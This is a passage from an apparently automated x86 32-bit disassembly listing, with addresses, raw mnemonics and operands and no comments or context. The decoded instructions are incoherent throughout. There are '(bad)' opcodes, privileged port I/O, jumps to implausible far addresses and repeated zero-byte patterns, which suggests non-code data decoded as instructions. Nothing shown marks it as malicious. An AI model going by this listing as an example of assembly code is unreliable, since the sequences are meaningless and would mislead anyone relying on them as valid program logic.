  421e0d:	jb     0x421e40
  421e0f:	inc    esp
  421e10:	sbb    dh,ah
  421e12:	xchg   esp,eax
  421e13:	pop    esp
  421e14:	ffree  st(3)
  421e16:	rol    DWORD PTR [ebp+ecx*8-0x71],cl
  421e1a:	int    0x8b
  421e1c:	test   eax,0xcd44d3b6
  421e21:	pop    edi
  421e22:	adc    eax,0x74b6b98a
  421e27:	mov    DWORD PTR [ebp-0x7a76faae],ebp
  421e2d:	push   edx
  421e2e:	or     DWORD PTR [ecx+0x530d5285],ecx
  421e34:	pusha  
  421e35:	inc    esp
  421e36:	in     eax,dx
  421e37:	(bad)  
  421e38:	mov    ecx,0x900c6b36
  421e3d:	imul   esp,esi,0x115a0b85
  421e43:	add    BYTE PTR [esi-0x1c],al
  421e46:	daa    
  421e47:	out    0xba,eax
  421e49:	xchg   esp,eax
  421e4a:	adc    al,BYTE PTR [eax]
  421e4c:	or     esp,DWORD PTR [edx+0xfc6d]
  421e52:	add    BYTE PTR [eax],al
  421e54:	add    BYTE PTR [esi+ebx*1],bl
  421e57:	push   0xffffffcc
  421e59:	js     0x421df1
  421e5b:	jle    0x421e5b
  421e5d:	xchg   esp,ebx
  421e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e60:	and    ebp,DWORD PTR [eax+ecx*8+0x75cc86b0]
  421e67:	leave  
  421e68:	xchg   ah,ch
  421e6a:	jge    0x421e4d
  421e6c:	gs or  eax,0xb4abd99
  421e72:	pop    ds
  421e73:	in     eax,0x50
  421e75:	adc    esi,DWORD PTR [ecx-0x4fe2affe]
  421e7b:	add    dh,BYTE PTR [edi+0x118e39]
  421e81:	sub    BYTE PTR [eax+0x3a],ah
  421e84:	std    
  421e85:	aaa    
  421e86:	aam    0x59
  421e88:	or     BYTE PTR [ebx-0x52],0xe6
  421e8c:	mov    bh,0xe6
  421e8e:	pop    eax
  421e8f:	adc    DWORD PTR [eax],eax
  421e91:	mov    dh,0xd2
  421e93:	lods   eax,DWORD PTR ds:[esi]
  421e94:	and    ebp,DWORD PTR [eax+0x74]
  421e97:	int    0x8a
  421e99:	push   esp
  421e9a:	jge    0x421e61
  421e9c:	dec    edi
  421e9d:	arpl   si,bx
  421e9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ea0:	and    esi,DWORD PTR [eax-0x6e6f52cf]
  421ea6:	pop    ecx
  421ea7:	push   0xffffffc8
  421ea9:	jbe    0x421e8d
  421eab:	lods   eax,DWORD PTR ds:[esi]
  421eac:	and    edi,DWORD PTR [eax-0x6f71f4bf]
  421eb2:	pop    ecx
  421eb3:	fs dec ebx
  421eb5:	lods   al,BYTE PTR ds:[esi]
  421eb6:	or     DWORD PTR [ecx],0x7
  421ebc:	add    BYTE PTR [eax],al
  421ebe:	and    esi,DWORD PTR [edx-0x747efc0a]
  421ec4:	test   al,0x76
  421ec6:	push   ebx
  421ec7:	xchg   esi,eax
  421ec8:	jmp    0x421e9d
  421eca:	or     bh,dh
  421ecc:	adc    ebp,eax
  421ece:	mov    bh,0x20
  421ed0:	shr    BYTE PTR [eax],0xa4
  421ed3:	cmp    bh,BYTE PTR [ebx+ebx*1]
  421ed6:	(bad)  
  421ed7:	inc    eax
  421ed8:	test   DWORD PTR [ebx],0xffba3b3e
  421ede:	sbb    BYTE PTR [esi-0x1],bh
  421ee1:	dec    ebx
  421ee2:	imul   esi,DWORD PTR [ebx+0x386f7cf7],0x512f80d
  421eec:	sbb    eax,0xbb396c28
  421ef1:	fistp  QWORD PTR [edi+0x1a]
  421ef4:	(bad)  
  421ef5:	scas   eax,DWORD PTR es:[edi]
  421ef6:	les    edi,FWORD PTR [edi]
  421ef8:	mov    bl,0xdf
  421efa:	xchg   DWORD PTR [ebx],edi
  421efc:	fistp  WORD PTR [edi+0x4787fe5a]
  421f03:	outs   dx,BYTE PTR ds:[esi]
  421f04:	jae    0x421f4a
  421f06:	ret    
  421f07:	test   eax,0xb31498cf
  421f0c:	div    edx
  421f0e:	push   esi
  421f0f:	xor    bl,BYTE PTR [edi+0x7ab6b9e4]
  421f15:	shl    BYTE PTR [ebx-0x36],1
  421f18:	ss jge 0x421eee
  421f1b:	xchg   esi,eax
  421f1c:	mov    edi,0xf74fab1b
  421f21:	add    eax,DWORD PTR [eax]
  421f23:	add    BYTE PTR [eax],al
  421f25:	add    BYTE PTR [eax],al
  421f27:	sbb    edi,edi
  421f29:	rcl    DWORD PTR [ebx],cl
  421f2b:	call   0x9046bce4
  421f30:	xor    edx,ecx
  421f32:	fwait
  421f33:	jnp    0x421f2b
  421f35:	not    DWORD PTR [ebx]
  421f37:	js     0x421eeb
  421f39:	test   DWORD PTR [ebx],0xdd0ed910
  421f3f:	push   esp
  421f40:	or     DWORD PTR [ebx],esi
  421f42:	shl    DWORD PTR [esi-0x40],1
  421f45:	xchg   ch,bh
  421f47:	shr    DWORD PTR [ebp-0x66],cl
  421f4a:	lods   eax,DWORD PTR ds:[esi]
  421f4b:	fistp  QWORD PTR [ebp+0x6e0b27f6]
  421f51:	in     eax,dx
  421f52:	inc    edx
  421f53:	in     al,dx
  421f54:	adc    eax,0x55a4bd16
  421f59:	test   al,0xcd
  421f5b:	xchg   ebx,eax
  421f5c:	mov    dl,0x98
  421f5e:	lods   eax,DWORD PTR ds:[esi]
  421f5f:	mov    bh,0xc5
  421f61:	mov    dh,0xea
  421f63:	aas    
  421f64:	xchg   edi,eax
  421f65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f66:	jne    0x421f4f
  421f68:	lods   eax,DWORD PTR ds:[esi]
  421f69:	push   cs
  421f6a:	adc    DWORD PTR [ecx-0x516f06e],esi
  421f70:	icebp  
  421f71:	xor    dh,cl
  421f73:	or     ebp,DWORD PTR [ebp-0x13]
  421f76:	jmp    0x6b389b8e
  421f7b:	mov    ah,0x6c
  421f7d:	pop    ebp
  421f7e:	or     DWORD PTR [ebx+eax*1-0x3f8965be],0x7a
  421f86:	stc    
  421f87:	push   ebx
  421f88:	ins    DWORD PTR es:[edi],dx
  421f89:	clc    
  421f8a:	clc    
  421f8b:	add    BYTE PTR [eax],al
  421f8d:	add    BYTE PTR [eax],al
  421f8f:	add    bl,bl
  421f91:	mov    cl,0x62
  421f93:	in     al,0x1b
  421f95:	ins    DWORD PTR es:[edi],dx
  421f96:	in     eax,dx
  421f97:	jmp    0xc644faaf
  421f9c:	or     BYTE PTR [edx+0x2],0x29
  421fa0:	xchg   esp,eax
  421fa1:	cmp    DWORD PTR [edx+0xd],ebx
  421fa4:	test   BYTE PTR [edx+0x39],bl
  421fa7:	pop    ebx
  421fa8:	xchg   esp,eax
  421fa9:	mov    dl,0x4d
  421fab:	inc    edi
  421fac:	(bad)  [ecx]
  421fae:	call   0xc73f:0x4171c884
  421fb5:	mov    eax,ds:0x646b3ac9
  421fba:	cdq    
  421fbb:	add    BYTE PTR [edx-0x37],ch
  421fbe:	pop    ss
  421fbf:	fucompp 
  421fc1:	mov    al,0x91
  421fc3:	rcl    ch,0x46
  421fc6:	pop    ebp
  421fc7:	mov    ebp,DWORD PTR [esi]
  421fc9:	das    
  421fca:	cmc    
  421fcb:	std    
  421fcc:	push   eax
  421fcd:	mov    cl,0xe
  421fcf:	test   DWORD PTR [ecx+0x22],ebp
  421fd2:	fiadd  WORD PTR [ebp-0x74b7e2a9]
  421fd8:	mov    cs,ecx
  421fda:	pop    esi
  421fdb:	fidivr WORD PTR [ecx+0x34f097b0]
  421fe1:	lahf   
  421fe2:	pusha  
  421fe3:	add    al,0x9b
  421fe5:	lock test BYTE PTR [esi+0x53],0x68
  421fea:	notrack jmp DWORD PTR [eax+ecx*4-0x72]
  421fef:	inc    esp
  421ff0:	imul   edx,DWORD PTR [ebp+0x7800],0x7b000000
  421ffa:	jo     0x421fe9
  421ffc:	test   BYTE PTR [ecx+0x79c7161b],bh
  422002:	cld    
  422003:	xchg   esi,eax
  422004:	inc    eax
  422005:	imul   ebp,edi,0xb192047d
  42200b:	xchg   edi,eax
  42200c:	ret    
  42200d:	mov    ah,0xef
  42200f:	pusha  
  422010:	adc    dl,al
  422012:	fs cmc 
  422014:	pushf  
  422015:	mov    ecx,0xef8b0eb6
  42201a:	into   
  42201b:	adc    BYTE PTR [eax-0x37084fc7],0xa2
  422022:	scas   al,BYTE PTR es:[edi]
  422023:	cmc    
  422024:	(bad)  
  422025:	mov    ecx,0xe985ea95
  42202a:	and    dl,BYTE PTR [eax+edx*2]
  42202d:	mov    ch,BYTE PTR [edi-0x3f66ea15]
  422033:	dec    esi
  422034:	add    BYTE PTR [ebx-0x6ffd090f],al
  42203a:	or     DWORD PTR [edx],edx
  42203c:	pop    ebp
  42203d:	dec    esi
  42203e:	mov    al,ds:0x461b524f
  422043:	xchg   ecx,eax
  422044:	jmp    0x422072
  422046:	pop    edx
  422047:	adc    DWORD PTR [eax],eax
  422049:	shl    BYTE PTR ds:[ecx],1
  42204c:	or     dl,0xdc
  42204f:	jecxz  0x421fd4
  422051:	out    dx,eax
  422052:	pop    ecx
  422053:	adc    DWORD PTR [eax],eax
  422055:	(bad)  
  422056:	push   ss
  422057:	in     eax,0x1
  422059:	iret   
  42205a:	push   ds
  42205b:	xor    eax,0x7f
  422060:	add    BYTE PTR [eax],al
  422062:	nop
  422063:	pop    ecx
  422064:	adc    DWORD PTR [esi+eax*4-0x1a],esi
  422068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422069:	sti    
  42206a:	inc    ecx
  42206b:	fisub  WORD PTR [ebp+0x57]
  42206e:	xchg   edi,eax
  42206f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422070:	xor    ecx,DWORD PTR [esi-0x1e]
  422073:	pushf  
  422074:	sbb    eax,0x11199e38
  422079:	adc    DWORD PTR [eax+0x45],0x15
  42207d:	or     DWORD PTR [eax-0x3c],0x5990e109
  422084:	adc    DWORD PTR [ebx-0x753d4a33],ecx
  42208a:	adc    eax,0x57fc3211
  42208f:	dec    ecx
  422090:	mov    edi,0x1b19a5fc
  422095:	inc    eax
  422096:	nop
  422097:	xor    BYTE PTR [ecx],0x69
  42209a:	xchg   edx,eax
  42209b:	out    dx,eax
  42209c:	mov    WORD PTR [esi],?
  42209e:	sbb    eax,0x2ffc33a1
  4220a3:	push   es
  4220a4:	retf   0x8c69
  4220a7:	out    0x6c,al
  4220a9:	pop    ebx
  4220aa:	pop    ds
  4220ab:	sub    al,0x32
  4220ad:	dec    edi
  4220ae:	add    eax,0xd64f329e
  4220b3:	xchg   ebp,eax
  4220b4:	jecxz  0x4220b4
  4220b6:	out    dx,eax
  4220b7:	mov    cl,0xf1
  4220b9:	xchg   ebx,eax
  4220ba:	jmp    FWORD PTR [edx+0x7a]
  4220bd:	jle    0x422118
  4220bf:	imul   eax,DWORD PTR [esp-0x41b4fdbf],0x0
  4220c7:	add    BYTE PTR [eax],al
  4220c9:	add    BYTE PTR [eax],al
  4220cb:	repz add DWORD PTR [eax-0x84df026],eax
  4220d2:	sbb    BYTE PTR [eax],bh
  4220d4:	aam    0x78
  4220d6:	imul   di,WORD PTR [si+0x24],0xff9c
  4220dc:	in     eax,0x9a
  4220de:	cdq    
  4220df:	(bad)  
  4220e0:	cmp    eax,0x6ab4a372
  4220e5:	inc    esp
  4220e6:	rcr    DWORD PTR [edx],cl
  4220e8:	cmc    
  4220e9:	push   edi
  4220ea:	ror    ebp,cl
  4220ec:	hlt    
  4220ed:	in     al,0xff
  4220ef:	mov    bh,0xb2
  4220f1:	inc    edi
  4220f2:	add    edx,DWORD PTR [eax-0x733685c3]
  4220f8:	push   0x3c
  4220fa:	rcl    edi,1
  4220fc:	aaa    
  4220fd:	mov    edx,0x55acf33
  422102:	je     0x42217b
  422104:	push   0x10
  422106:	or     dl,bh
  422108:	(bad)  
  422109:	dec    edx
  42210a:	mov    esi,0xd3f7dd47
  42210f:	pop    esp
  422110:	rcl    BYTE PTR [edi+0x78b2d00d],0x3f
  422117:	fwait
  422118:	pusha  
  422119:	mov    dl,0xf7
  42211b:	inc    esi
  42211c:	out    0xe2,al
  42211e:	dec    ecx
  42211f:	sar    BYTE PTR [ecx+0x66d24af3],cl
  422125:	jmp    0xd0f4b12d
  42212a:	cmovle esi,eax
  42212d:	in     al,0x4
  42212f:	add    BYTE PTR [eax],al
  422131:	add    BYTE PTR [eax],al
  422133:	add    BYTE PTR [ebp-0x10],dl
  422136:	stos   DWORD PTR es:[edi],eax
  422137:	or     dl,BYTE PTR [eax+0x1de90eb2]
  42213d:	cmc    
  42213e:	push   ss
  42213f:	popa   
  422140:	fnstcw WORD PTR [eax+edi*2+0x1af520ed]
  422147:	cmp    DWORD PTR [ecx],esp
  422149:	cmc    
  42214a:	retf   0x5a39
  42214d:	hlt    
  42214e:	sbb    ah,ah
  422150:	pop    ecx
  422151:	hlt    
  422152:	sbb    al,0xe9
  422154:	stos   DWORD PTR es:[edi],eax
  422155:	adc    DWORD PTR [ebp+0x533b93e9],ebx
  42215b:	jne    0x422174
  42215d:	sub    dl,BYTE PTR [edx]
  42215f:	sbb    DWORD PTR [ecx],esp
  422161:	add    eax,0x516272cb
  422166:	jp     0x422108
  422168:	jae    0x4221d0
  42216a:	and    DWORD PTR [eax],esp
  42216c:	sbb    BYTE PTR [edx],ch
  42216e:	sbb    eax,0xcf3a4d74
  422173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422174:	dec    esp
  422175:	jae    0x42218d
  422177:	jmp    0xee247f88
  42217c:	xchg   ebx,eax
  42217d:	mov    dl,0x41
  42217f:	xchg   esp,eax
  422180:	dec    ecx
  422181:	cmp    bl,bh
  422183:	mov    esi,0xd132e50c
  422188:	stos   DWORD PTR es:[edi],eax
  422189:	sahf   
  42218a:	lods   al,BYTE PTR ds:[esi]
  42218b:	jmp    0xce19c523
  422190:	lea    esi,[edi-0x75b8d77e]
  422196:	inc    ecx
  422197:	xchg   ebx,eax
  422198:	add    BYTE PTR [eax],al
  42219a:	add    BYTE PTR [eax],al
  42219c:	add    BYTE PTR [ebp+edi*1+0x3192cd42],cl
  4221a3:	pop    edx
  4221a4:	lds    ebx,FWORD PTR [edi+0x3a]
  4221a7:	(bad)  
  4221a9:	call   0x10210ece
  4221ae:	sub    DWORD PTR ds:0xeb3166d,ebx
  4221b4:	jmp    0x7516ce
  4221b9:	xor    DWORD PTR ds:[ebp+0xf4cad0f],ebp
  4221c0:	add    cl,bh
  4221c2:	ret    
  4221c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221c4:	shr    BYTE PTR [edx-0x326b67e2],0x3c
  4221cb:	verw   cx
  4221ce:	aaa    
  4221cf:	fucomi st,st(0)
  4221d1:	(bad)  
  4221d2:	or     al,0xeb
  4221d4:	jmp    FWORD PTR [ebp-0xb]
  4221d7:	sbb    al,BYTE PTR [ebp+esi*4-0x19fff150]
  4221de:	or     dl,BYTE PTR [edx+0x24]
  4221e1:	out    dx,al
  4221e2:	xchg   edi,eax
  4221e3:	pop    ss
  4221e4:	dec    eax
  4221e5:	add    ecx,ebp
  4221e7:	adc    DWORD PTR [eax+0x740eb4ab],eax
  4221ed:	call   0x4bb7cf2b
  4221f2:	cmp    dh,dl
  4221f4:	push   0xffffffac
  4221f6:	sub    al,0x3e
  4221f8:	test   DWORD PTR [eax-0x2c],esp
  4221fb:	adc    bh,bh
  4221fd:	test   eax,0x441bb4
  422202:	add    BYTE PTR [eax],al
  422204:	add    BYTE PTR [eax],al
  422206:	mov    esi,0xfe0f0f15
  42220b:	repz dec eax
  42220d:	mov    DWORD PTR ds:0xe4550d50,ebp
  422213:	outs   dx,DWORD PTR ds:[esi]
  422214:	xor    DWORD PTR [ecx+ebp*1],esp
  422217:	sub    ch,dl
  422219:	adc    eax,0x2d6a4d
  42221e:	push   edx
  42221f:	sti    
  422220:	sbb    al,BYTE PTR [ebp+0xeae71]
  422226:	pop    ds
  422227:	xchg   DWORD PTR [ecx+0x24],ebp
  42222a:	push   ebp
  42222b:	dec    ebx
  42222c:	jmp    FWORD PTR [edi+0x2199d28]
  422232:	sub    DWORD PTR [ecx+ebx*4-0x6d4a6f74],esi
  422239:	add    DWORD PTR [eax+0x2bc81259],edx
  42223f:	xor    al,0xc3
  422241:	mov    cl,0x3
  422244:	pop    ss
  422245:	pop    eax
  422246:	pusha  
  422247:	into   
  422248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422249:	and    esp,DWORD PTR [eax-0x2c]
  42224c:	inc    eax
  42224d:	xchg   DWORD PTR [ebp+esi*2-0xf],ebx
  422251:	out    0xd3,eax
  422253:	add    BYTE PTR [eax],dh
  422255:	cld    
  422256:	adc    al,0x1a
  422258:	inc    DWORD PTR [ebx+0x115af1]
  42225e:	adc    BYTE PTR [esi+0x588d47f6],ch
  422264:	xchg   esp,eax
  422265:	aad    0x91
  422267:	pop    ecx
  422268:	adc    esi,esi
  42226a:	add    BYTE PTR [eax],al
  42226c:	add    BYTE PTR [eax],al
  42226e:	add    BYTE PTR [ebp+ebp*2-0x3],cl
  422272:	inc    BYTE PTR [ebx+0x5f]
  422275:	push   esi
  422276:	inc    ebx
  422277:	ins    BYTE PTR es:[edi],dx
  422278:	jno    0x422260
  42227a:	jmp    FWORD PTR [edi+0x6c6b9859]
  422280:	adc    eax,0x7e090b3a
  422285:	cmc    
  422286:	push   edi
  422287:	iret   
  422288:	or     eax,0x59a75bf5
  42228d:	adc    DWORD PTR [eax],eax
  42228f:	xchg   edi,eax
  422290:	(bad)  
  422292:	and    ecx,ebx
  422294:	in     al,0xfd
  422296:	ja     0x42223a
  422298:	sbb    DWORD PTR [ecx],edx
  42229a:	xor    DWORD PTR [ecx-0x2c],ebx
  42229d:	or     DWORD PTR [ecx-0x80],ebp
  4222a0:	shr    BYTE PTR [esi-0x26ec63dd],cl
  4222a6:	or     al,0xc
  4222a8:	sub    dl,BYTE PTR [eax]
  4222aa:	add    BYTE PTR [eax-0x1c8c26ef],dl
  4222b0:	adc    esi,edi
  4222b2:	or     BYTE PTR ds:0x9003f6b2,0x1
  4222b9:	sub    cl,BYTE PTR [edi+0x3c78e03]
  4222bf:	nop
  4222c0:	mov    dl,0x70
  4222c2:	push   ecx
  4222c3:	aaa    
  4222c4:	jmp    FWORD PTR [eax+eiz*1+0x14]
  4222c8:	cs mov bh,0x10
  4222cb:	adc    al,0xdd
  4222cd:	test   BYTE PTR [ebx],0x90
  4222d0:	fcom   QWORD PTR [edi]
  4222d2:	scas   al,BYTE PTR es:[edi]
  4222d3:	add    BYTE PTR [eax],al
  4222d5:	add    BYTE PTR [eax],al
  4222d7:	add    BYTE PTR [edi+0x10ebca67],dl
  4222dd:	out    dx,al
  4222de:	mul    DWORD PTR [eax]
  4222e0:	ret    0x7f3a
  4222e3:	mov    ch,BYTE PTR [ebx-0x72]
  4222e6:	mov    edi,0x7bb6dc86
  4222eb:	add    edi,edx
  4222ed:	imul   WORD PTR [ebp-0xbedf55c]
  4222f4:	sub    eax,0x4fbbf439
  4222f9:	xor    eax,0xb1abe77b
  4222fe:	test   DWORD PTR [ebx],0xbbc3540
  422304:	scas   eax,DWORD PTR es:[edi]
  422305:	(bad)  
  422306:	test   BYTE PTR [ebx],0x90
  422309:	add    edx,eax
  42230b:	add    cl,BYTE PTR [ebx]
  42230d:	(bad)  
  42230e:	adc    eax,DWORD PTR [ecx]
  422310:	sbb    DWORD PTR [ebp+0x4f],esi
  422313:	push   cs
  422314:	cmp    eax,0x3f873c66
  422319:	mov    dh,0x7b
  42231b:	in     al,dx
  42231c:	jbe    0x422384
  42231e:	test   DWORD PTR [ebp-0x7813712d],0x73b627
  422328:	pop    edi
  422329:	not    sp
  42232c:	dec    esi
  42232d:	mov    dh,0x25
  42232f:	inc    ebx
  422330:	fiadd  WORD PTR [edx]
  422332:	pcmpgtb mm7,QWORD PTR [edi-0x6c1ae96f]
  422339:	mov    dl,0x99
  42233b:	mov    bh,0x0
  42233d:	add    BYTE PTR [eax],al
  42233f:	add    BYTE PTR [eax],al
  422341:	fs push ecx
  422343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422344:	fimul  WORD PTR [edi+0xfe6ce31]
  42234a:	mov    ah,0xf
  42234c:	jmp    0x2de6dae4
  422351:	sub    BYTE PTR [edi+0x3a1cb021],bh
  422357:	adc    ch,cl
  422359:	(bad)  
  42235a:	mov    dl,0xe
  42235c:	pop    esp
  42235d:	enter  0x4291,0x39
  422361:	cmp    eax,0xf8659bf5
  422366:	mov    ecx,0x293e912
  42236b:	cwde   
  42236c:	sbb    eax,0xdcedd1e8
  422371:	inc    edi
  422372:	ror    BYTE PTR [esi-0x17],0x18
  422376:	es (bad) 
  422379:	stc    
  42237a:	mov    cl,0x46
  42237c:	arpl   WORD PTR [esp+ecx*2-0x80],di
  422380:	jmp    0x3063d618
  422385:	sbb    dh,BYTE PTR [ebp-0x67]
  422388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422389:	scas   eax,DWORD PTR es:[edi]
  42238a:	add    DWORD PTR [eax+eiz*1+0x7f1dc2f8],edx
  422391:	push   edx
  422392:	cmp    dl,BYTE PTR [edx+0x65]
  422395:	dec    esp
  422396:	pushf  
  422397:	dec    edi
  422398:	in     eax,dx
  422399:	pop    ds
  42239a:	xchg   edx,eax
  42239b:	cdq    
  42239c:	mov    al,ds:0x9cd7307f
  4223a1:	lahf   
  4223a2:	shr    BYTE PTR [bx+di+0x0],1
  4223a6:	add    BYTE PTR [eax],al
  4223a8:	add    BYTE PTR [eax],al
  4223aa:	mov    dh,BYTE PTR [ebx-0x4ec5c8a0]
  4223b0:	inc    esi
  4223b1:	arpl   WORD PTR [ebp+ebp*1+0x6945004a],bx
  4223b8:	jmp    0x9115:0xea1d5574
  4223bf:	imul   ebp,DWORD PTR ds:0x964b9200,0x51
  4223c6:	cmp    DWORD PTR [eax],edi
  4223c8:	push   esp
  4223c9:	sbb    BYTE PTR [ecx+0x15],al
  4223cc:	cwde   
  4223cd:	add    BYTE PTR [ecx],bh
  4223cf:	cmp    ch,ah
  4223d1:	mov    ebp,ecx
  4223d3:	pop    edx
  4223d4:	and    eax,0x114a4e85
  4223d9:	mov    bl,0xf8
  4223db:	xchg   edi,eax
  4223dc:	ret    0xe66a
  4223df:	sub    BYTE PTR [ebx+0x39],dh
  4223e2:	test   BYTE PTR [ecx-0x42],0x33
  4223e6:	sub    DWORD PTR [esi],esi
  4223e8:	push   edx
  4223e9:	sbb    BYTE PTR [eax+0x6c],ah
  4223ec:	adc    ebx,ebp
  4223ee:	xor    BYTE PTR [esi],bl
  4223f0:	ja     0x4223f6
  4223f2:	mov    eax,ds:0xc554981e
  4223f7:	adc    al,0x96
  4223f9:	into   
  4223fa:	and    DWORD PTR [esi-0x5d],edi
  4223fd:	(bad)  
  4223fe:	ds sub eax,0x189a74ad
  422404:	add    DWORD PTR [edx-0x3f],ebp
  422407:	ret    
  422408:	and    BYTE PTR [eax],ch
  42240a:	cmp    ch,BYTE PTR [ebp-0x13]
  42240d:	inc    BYTE PTR [eax]
  42240f:	add    BYTE PTR [eax],al
  422411:	add    BYTE PTR [eax],al
  422413:	fs cmp ch,ah
  422416:	mov    ebp,ecx
  422418:	dec    esp
  422419:	and    eax,0x154a4e85
  42241e:	mov    bl,0x78
  422420:	cmp    BYTE PTR [ecx+0x24],cl
  422423:	popa   
  422424:	cdq    
  422425:	add    eax,0x77286b6a
  42242a:	add    al,0x7
  42242c:	aaa    
  42242d:	adc    bl,BYTE PTR [eax+0x29]
  422430:	inc    ebx
  422431:	push   ecx
  422432:	and    al,0x90
  422434:	xor    DWORD PTR [ecx-0x5eb22876],esp
  42243a:	out    0x6b,eax
  42243c:	ficom  WORD PTR [ecx]
  42243e:	add    BYTE PTR [ebx-0x6d965e67],al
  422444:	inc    ecx
  422445:	mov    eax,ds:0xa56de48a
  42244a:	mov    BYTE PTR [esi-0x7e],al
  42244d:	xor    eax,0x96852fb2
  422452:	mov    edi,0xcc96659d
  422457:	sub    cl,ch
  422459:	jle    0x42245a
  42245b:	pop    ss
  42245c:	push   0xc66e5c51
  422461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422462:	jle    0x422430
  422464:	and    eax,0x18900016
  422469:	inc    ebx
  42246a:	(bad)  
  42246b:	adc    esi,DWORD PTR [ecx+0x1b]
  42246e:	adc    esp,0x4b
  422471:	adc    DWORD PTR [eax],eax
  422473:	outs   dx,BYTE PTR ds:[esi]
  422474:	rcl    dh,1
  422476:	and    eax,DWORD PTR [eax]
  422478:	add    BYTE PTR [eax],al
  42247a:	add    BYTE PTR [eax],al
  42247c:	dec    esp
  42247d:	stos   DWORD PTR es:[edi],eax
  42247e:	cdq    
  42247f:	inc    esp
  422480:	xchg   edx,eax
  422481:	pop    esp
  422482:	inc    ebx
  422483:	inc    ebx
  422484:	je     0x422428
  422486:	fimul  DWORD PTR [esp+ecx*1]
  422489:	rcl    BYTE PTR [eax+eax*1],0x90
  42248d:	xchg   ecx,eax
  42248e:	sbb    eax,DWORD PTR [ecx+eax*2+0x58001156]
  422495:	jge    0x4224b0
  422497:	adc    bl,0x54
  42249a:	cmp    BYTE PTR [edi-0x6a],dl
  42249d:	pop    ecx
  42249e:	adc    DWORD PTR [eax+0x115a10],edi
  4224a4:	sbb    DWORD PTR ds:0x15195ff5,ecx
  4224aa:	cmc    
  4224ab:	dec    edi
  4224ac:	or     eax,0xe05ff50d
  4224b1:	mov    dl,0x62
  4224b3:	enter  0xd6b3,0xa7
  4224b7:	mov    ch,0x64
  4224b9:	mov    ebp,0xb29ff5b7
  4224be:	jb     0x422504
  4224c0:	test   BYTE PTR ds:0xb29006ce,ch
  4224c6:	jp     0x422490
  4224c8:	jae    0x4224cc
  4224ca:	mov    BYTE PTR [esi+0x1738e13],cl
  4224d0:	nop
  4224d1:	mov    dl,0x27
  4224d3:	mov    dh,0x2c
  4224d5:	mov    ebp,0xb267f62f
  4224da:	jp     0x42251f
  4224dc:	mov    WORD PTR ds:0x6fa,gs
  4224e2:	add    BYTE PTR [eax],al
  4224e4:	add    BYTE PTR [eax+0x75f541b2],dl
  4224ea:	cmp    DWORD PTR [ebx],esi
  4224ec:	call   0xdba02f66
  4224f1:	push   ebx
  4224f2:	mov    cs,WORD PTR [edi-0x69]
  4224f5:	mov    bl,BYTE PTR [edi-0x71ec7549]
  4224fb:	ja     0x422500
  4224fd:	nop
  4224fe:	mov    dl,0x6e
  422500:	(bad)  
  422501:	mov    bl,0xd6
  422503:	dec    edx
  422504:	iret   
  422505:	mov    bl,0xda
  422507:	jg     0x4224f2
  422509:	push   es
  42250a:	arpl   WORD PTR [edx+ecx*4+0x53],bp
  42250e:	mov    fs,WORD PTR [edi-0x339d3880]
  422514:	xchg   DWORD PTR [eax+0x3803f7ad],ebp
  42251a:	scas   eax,DWORD PTR es:[edi]
  42251b:	test   DWORD PTR [edx],0x1cefd890
  422521:	bound  ebx,QWORD PTR [edx+0x6397c778]
  422527:	or     cl,BYTE PTR [eax-0x69a5c789]
  42252d:	cwde   
  42252e:	and    eax,0xfe0be80e
  422533:	xor    dl,cl
  422535:	stos   BYTE PTR es:[edi],al
  422536:	jae    0x42254a
  422538:	jmp    0xc5a484d0
  42253d:	ja     0x42256a
  42253f:	inc    edx
  422540:	int    0x47
  422542:	mov    ds:0x7008b9ce,eax
  422547:	test   bl,0x0
  42254a:	add    BYTE PTR [eax],al
  42254c:	add    BYTE PTR [eax],al
  42254e:	test   al,0x5e
  422550:	in     eax,dx
  422551:	push   0xffffffab
  422553:	pusha  
  422554:	sbb    al,0x6c
  422556:	or     al,0xb6
  422558:	push   cs
  422559:	jmp    0xd75136e
  42255e:	mov    esi,DWORD PTR [edx]
  422560:	call   0x7ae9:0xed619005
  422567:	retf   
  422568:	adc    BYTE PTR [edx],bl
  42256a:	lds    ecx,FWORD PTR [ecx]
  42256c:	inc    eax
  42256d:	jo     0x42257f
  42256f:	xchg   esi,eax
  422570:	jmp    0xf02d:0x99b293e9
  422577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422578:	aas    
  422579:	pusha  
  42257a:	adc    BYTE PTR [esi-0x4d6c17ea],dl
  422580:	aas    
  422581:	ins    BYTE PTR es:[edi],dx
  422582:	adc    BYTE PTR [esi-0x4d6c17ee],dl
  422588:	cmp    BYTE PTR ds:0x1d1d32ee,al
  42258f:	out    dx,al
  422590:	xor    dh,BYTE PTR [ecx]
  422592:	adc    eax,0xcb532ee
  422597:	es xor bl,cl
  42259a:	mov    WORD PTR [edx+0x71a1660e],?
  4225a0:	add    ebp,DWORD PTR [ecx-0x1931ca6d]
  4225a6:	or     DWORD PTR [ebx-0x336c16ee],esp
  4225ac:	add    eax,0x812a3600
  4225b1:	and    al,0x0
  4225b3:	add    BYTE PTR [eax],al
  4225b5:	add    BYTE PTR [eax],al
  4225b7:	shl    DWORD PTR [esi-0x130dfff2],1
  4225bd:	cmc    
  4225be:	ins    DWORD PTR es:[edi],dx
  4225bf:	std    
  4225c0:	mov    ebp,0x42b984ea
  4225c5:	add    eax,0x7526b933
  4225ca:	inc    DWORD PTR [esi+0x1f550eb6]
  4225d0:	mov    esp,0x756cdc00
  4225d5:	in     eax,dx
  4225d6:	test   BYTE PTR [ecx-0x53],bh
  4225d9:	pushf  
  4225da:	add    ch,BYTE PTR ds:0x158b0eb5
  4225e0:	cmp    DWORD PTR ds:0xe581ad8d,0xd3b53900
  4225ea:	inc    esp
  4225eb:	lea    edx,[esi+0x6d]
  4225ee:	add    BYTE PTR [ecx],ch
  4225f0:	mov    ch,0xf6
  4225f2:	cmp    DWORD PTR [ebp+0x3984eabc],ecx
